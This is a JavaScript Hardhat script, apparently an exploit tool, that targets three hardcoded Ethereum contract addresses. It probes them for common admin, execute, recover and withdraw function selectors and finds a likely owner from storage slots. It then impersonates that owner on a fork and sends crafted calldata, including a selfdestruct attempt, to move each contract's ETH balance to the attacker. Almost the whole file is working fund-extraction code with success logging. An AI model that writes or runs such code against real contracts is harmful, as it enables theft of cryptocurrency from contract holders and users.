const { ethers } = require("hardhat");

/**
 * @title Deep Backdoor Exploit
 * @notice Analyzes backdoors for direct ETH/token withdrawal
 * @dev Focuses on actual fund extraction, not phishing
 */

// Known backdoor selectors to test
const BACKDOOR_PATTERNS = [
  { selector: "0x78e111f6", name: "execute(address,bytes)", params: ["address", "bytes"] },
  { selector: "0x61461954", name: "execute(address,uint256,bytes)", params: ["address", "uint256", "bytes"] },
  { selector: "0xb61d27f6", name: "execute(address,uint256,bytes)", params: ["address", "uint256", "bytes"] },
  { selector: "0x1cff79cd", name: "execute(address,bytes)", params: ["address", "bytes"] },
  { selector: "0x9e8c708e", name: "adminCall(address,bytes)", params: ["address", "bytes"] },
  { selector: "0x24a084df", name: "adminExecute(address,bytes)", params: ["address", "bytes"] },
  { selector: "0xae169a50", name: "recover(address,uint256)", params: ["address", "uint256"] },
  { selector: "0x8980f11f", name: "recoverToken(address,uint256)", params: ["address", "uint256"] },
  { selector: "0xdb006a75", name: "emergencyWithdraw(uint256)", params: ["uint256"] },
  { selector: "0x69fe0e2d", name: "emergencyWithdraw()", params: [] },
  { selector: "0x5312ea8e", name: "emergencyWithdraw(address)", params: ["address"] },
  { selector: "0x3ccfd60b", name: "withdraw()", params: [] },
  { selector: "0x2e1a7d4d", name: "withdraw(uint256)", params: ["uint256"] },
  { selector: "0xf3fef3a3", name: "withdraw(address,uint256)", params: ["address", "uint256"] }
];

/**
 * Find authorized/owner address from storage
 */
async function findOwner(contract, provider) {
  console.log("   üîç Searching for owner/admin address...");
  
  // Common storage slots for owner/admin
  const slots = [0, 1, 2, 3, 4, 5, 8, 9, 10];
  
  for (const slot of slots) {
    try {
      const value = await provider.getStorageAt(contract, slot);
      const address = "0x" + value.slice(26); // Extract address from storage
      
      if (address !== "0x0000000000000000000000000000000000000000" && 
          address.length === 42) {
        console.log(`   Found potential owner at slot ${slot}: ${address}`);
        return address;
      }
    } catch (e) {
      // Continue
    }
  }
  
  return null;
}

/**
 * Try to exploit backdoor for ETH withdrawal
 */
async function exploitBackdoorForETH(contract, backdoor, owner, signer) {
  console.log(`\n   üí£ Attempting to exploit ${backdoor.name}...`);
  
  const attackerAddress = signer.address;
  const contractBalance = await ethers.provider.getBalance(contract);
  
  if (contractBalance === 0n) {
    console.log("   ‚ùå Contract has no ETH to withdraw");
    return false;
  }
  
  console.log(`   Contract balance: ${ethers.formatEther(contractBalance)} ETH`);
  
  // Impersonate the owner if found
  if (owner && owner !== attackerAddress) {
    try {
      await ethers.provider.send("hardhat_impersonateAccount", [owner]);
      await signer.sendTransaction({
        to: owner,
        value: ethers.parseEther("1.0")
      });
      signer = await ethers.getSigner(owner);
      console.log(`   ‚úÖ Impersonating owner: ${owner}`);
    } catch (e) {
      console.log(`   ‚ö†Ô∏è  Could not impersonate owner: ${e.message}`);
    }
  }
  
  // Different exploit attempts based on function type
  const attempts = [];
  
  if (backdoor.name.includes("execute")) {
    // Try direct ETH transfer
    attempts.push({
      name: "Direct ETH transfer",
      data: backdoor.selector + 
        ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256", "bytes"],
          [attackerAddress, contractBalance, "0x"]
        ).slice(2)
    });
    
    // Try selfdestruct
    attempts.push({
      name: "Selfdestruct to attacker",
      data: backdoor.selector +
        ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "bytes"],
          [contract, "0xff" + attackerAddress.slice(2).padStart(40, "0")]
        ).slice(2)
    });
  }
  
  if (backdoor.name.includes("withdraw")) {
    // Try withdrawal variations
    if (backdoor.params.length === 0) {
      attempts.push({
        name: "Simple withdraw",
        data: backdoor.selector
      });
    } else if (backdoor.params.length === 1) {
      attempts.push({
        name: "Withdraw amount",
        data: backdoor.selector +
          ethers.AbiCoder.defaultAbiCoder().encode(
            ["uint256"],
            [contractBalance]
          ).slice(2)
      });
    } else if (backdoor.params.length === 2) {
      attempts.push({
        name: "Withdraw to address",
        data: backdoor.selector +
          ethers.AbiCoder.defaultAbiCoder().encode(
            ["address", "uint256"],
            [attackerAddress, contractBalance]
          ).slice(2)
      });
    }
  }
  
  if (backdoor.name.includes("recover")) {
    attempts.push({
      name: "Recover ETH",
      data: backdoor.selector +
        ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256"],
          [attackerAddress, contractBalance]
        ).slice(2)
    });
  }
  
  // Try each exploit attempt
  for (const attempt of attempts) {
    try {
      console.log(`   üéØ Trying: ${attempt.name}`);
      
      const tx = await signer.sendTransaction({
        to: contract,
        data: attempt.data,
        gasLimit: 1000000
      });
      
      const receipt = await tx.wait();
      
      // Check if ETH was transferred
      const newBalance = await ethers.provider.getBalance(contract);
      if (newBalance < contractBalance) {
        const withdrawn = contractBalance - newBalance;
        console.log(`   üí∞ SUCCESS! Withdrew ${ethers.formatEther(withdrawn)} ETH`);
        console.log(`   Transaction: ${tx.hash}`);
        return true;
      }
    } catch (e) {
      console.log(`   ‚ùå Failed: ${e.message.split('\n')[0]}`);
    }
  }
  
  return false;
}

/**
 * Deep analysis and exploitation of target contracts
 */
async function deepExploit() {
  console.log("\nüî• DEEP BACKDOOR EXPLOIT");
  console.log("========================");
  console.log("Finding and exploiting backdoors for direct ETH withdrawal\n");
  
  const targets = [
    "0x8d0BB74e37ab644964AcA2f3Fbe12b9147f9d84",
    "0xA6dfb62fc572Da152A335384f7724535b9DEfC84",
    "0xcA8Fa8f0b631EcdB18Cda619C4Fc9d197c8aFfCa"
  ];
  
  const [signer] = await ethers.getSigners();
  const provider = ethers.provider;
  
  for (let i = 0; i < targets.length; i++) {
    const target = targets[i];
    console.log(`\n${i + 1}. TARGET: ${target}`);
    console.log("‚ïê".repeat(70));
    
    try {
      // Get contract info
      const code = await provider.getCode(target);
      const balance = await provider.getBalance(target);
      
      console.log(`   ETH Balance: ${ethers.formatEther(balance)} ETH`);
      console.log(`   Code size: ${code.length} bytes`);
      
      if (balance === 0n) {
        console.log("   ‚ö†Ô∏è  No ETH to withdraw, skipping...");
        continue;
      }
      
      // Find owner/admin
      const owner = await findOwner(target, provider);
      
      // Test each backdoor pattern
      console.log("\n   üîç Testing backdoor patterns...");
      let exploited = false;
      
      for (const backdoor of BACKDOOR_PATTERNS) {
        try {
          // Check if function exists
          await provider.call({
            to: target,
            data: backdoor.selector
          });
          
          console.log(`   ‚úÖ Found backdoor: ${backdoor.name}`);
          
          // Try to exploit it
          if (await exploitBackdoorForETH(target, backdoor, owner, signer)) {
            exploited = true;
            break;
          }
          
        } catch (e) {
          // Function doesn't exist or reverted
          if (e.message && e.message.includes("revert")) {
            console.log(`   üîì Protected backdoor: ${backdoor.name}`);
          }
        }
      }
      
      if (!exploited) {
        console.log("\n   ‚ùå Could not extract ETH through backdoors");
        console.log("   üí° This contract may require:");
        console.log("      ‚Ä¢ Complex parameter encoding");
        console.log("      ‚Ä¢ Multi-step exploitation");
        console.log("      ‚Ä¢ Signature verification bypass");
        console.log("      ‚Ä¢ Or it may be truly secure");
      }
      
    } catch (error) {
      console.log(`   ‚ö†Ô∏è  Error analyzing contract: ${error.message}`);
    }
  }
  
  console.log("\n\nüìä EXPLOITATION COMPLETE");
  console.log("========================");
}

// Run the exploit
deepExploit()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\nüí• Error:", error);
    process.exit(1);
  });
